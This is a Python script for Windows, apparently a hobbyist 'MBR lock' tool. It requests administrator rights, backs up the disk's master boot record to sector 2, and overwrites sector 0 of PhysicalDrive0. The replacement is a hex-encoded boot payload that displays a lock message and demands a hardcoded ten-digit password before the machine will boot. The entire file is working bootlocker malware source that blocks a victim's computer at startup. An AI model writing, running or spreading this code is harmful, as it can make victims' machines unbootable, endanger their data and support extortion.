#by yunchenqwq
import ctypes
import os
import sys

PHYSICAL_SECTOR_SIZE = 512
lock =bytearray([0X8C,0XC8,0X8E,0XD8,0X8E,0XD0,0X8E,0XC0,0XBC,0X00,0X01,0XBD,0XB8,0X7C,0XB9,0X8A,0X00,0XB8,
0X01,0X13,0XBB,0X1A,0X00,0XB2,0X00,0XCD,0X10,0XB8,0X00,0XB8,0X05,0XA0,0X00,0X8E,0XD8,0X31,0XC9,0X31,0XDB,
0X31,0XC0,0XCD,0X16,0X3C,0X08,0X74,0X11,0X3C,0X0D,0X74,0X17,0XB4,0X02,0X88,0X07,0X88,0X67,0X01,0X83,0XC3,
0X02,0X41,0XEB,0XE7,0X83,0XEB,0X02,0X49,0X31,0XC0,0X89,0X07,0XEB,0XDD,0X8C,0XC8,0X8E,0XC0,0X31,0XDB,0XBE,
0X43,0X7D,0X2E,0X8A,0X0E,0X42,0X7D,0XB5,0X00,0X3E,0X8A,0X07,0X26,0X8A,0X24,0X38,0XE0,0X75,0X2F,0X83,0XC3,
0X02,0X46,0XE2,0XF0,0X31,0XC0,0XB8,0X00,0X7E,0X8E,0XC0,0X31,0XDB,0XB4,0X02,0XB2,0X80,0XB0,0X01,0XB6,0X00,
0XB5,0X00,0XB1,0X03,0XCD,0X13,0X31,0XDB,0XB2,0X80,0XB4,0X03,0XB0,0X01,0XB6,0X00,0XB5,0X00,0XB1,0X01,0XCD,
0X13,0XEB,0X1C,0XBB,0X00,0XB8,0X81,0XC3,0X8A,0X00,0XB0,0X58,0X88,0X07,0X2E,0X8B,0X0E,0X42,0X7D,0X31,0XC0,
0X89,0X07,0X83,0XC3,0X02,0XE2,0XF9,0XE9,0X51,0XFF,0XB8,0XFF,0XFF,0X50,0XB8,0X00,0X00,0X50,0XCB,0X54,0X68,
0X69,0X73,0X20,0X44,0X69,0X73,0X6B,0X20,0X61,0X6C,0X72,0X65,0X61,0X64,0X79,0X20,0X68,0X61,0X73,0X20,0X44,
0X69,0X73,0X6B,0X70,0X72,0X6F,0X74,0X65,0X63,0X74,0X69,0X6F,0X6E,0X20,0X4C,0X4F,0X43,0X4B,0X2C,0X50,0X6C,
0X65,0X61,0X73,0X65,0X20,0X65,0X6E,0X74,0X65,0X72,0X20,0X74,0X68,0X65,0X20,0X70,0X61,0X73,0X73,0X77,0X6F,
0X72,0X64,0X20,0X74,0X6F,0X20,0X75,0X6E,0X6C,0X6F,0X63,0X6B,0X0A,0X0D,0X47,0X69,0X74,0X68,0X75,0X62,0X3A,
0X68,0X74,0X74,0X70,0X73,0X3A,0X2F,0X2F,0X67,0X69,0X74,0X68,0X75,0X62,0X2E,0X63,0X6F,0X6D,0X2F,0X59,0X75,
0X6E,0X43,0X68,0X65,0X6E,0X71,0X77,0X71,0X2F,0X4D,0X42,0X52,0X6C,0X6F,0X63,0X6B,0X0A,0X0D,0X28,0X2A,0XEF,
0XBC,0XBE,0X2D,0XEF,0XBC,0XBE,0X2A,0X29,0X0A,0X0D,0X0A,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,0X41,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,
0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X0F,0X55,0XAA])
old_mbr = bytearray(PHYSICAL_SECTOR_SIZE)
lock
def write_disk_sector(file_handle, sector_id, buffer):
    offset = sector_id * 512
    if buffer is None:
        return False
    file_handle.seek(offset)
    file_handle.write(buffer)
    return True

def read_disk_sector(file_handle, sector_id, buffer):
    offset = sector_id * 512
    if buffer is None:
        return False
    file_handle.seek(offset)
    data = file_handle.read(PHYSICAL_SECTOR_SIZE)
    if len(data) > 0:
        buffer[:len(data)] = data
        return True
    return False

def main():
    disk_path = r'\\.\PhysicalDrive0'

    # 请求管理员权限
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    try:
        with open(disk_path, 'r+b') as disk_handle:
            password = b'1234567890'  #没有考虑长度问题 所以目前密码固定只支持10位 若少于十位则自动用A补齐
            for i in range(10):
                lock[323 + i] = password[i]

            read_disk_sector(disk_handle, 0, old_mbr)
            write_disk_sector(disk_handle, 0, lock)
            write_disk_sector(disk_handle, 2, old_mbr)

        print("完成")
    except IOError as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
    input("按任意键继续...")
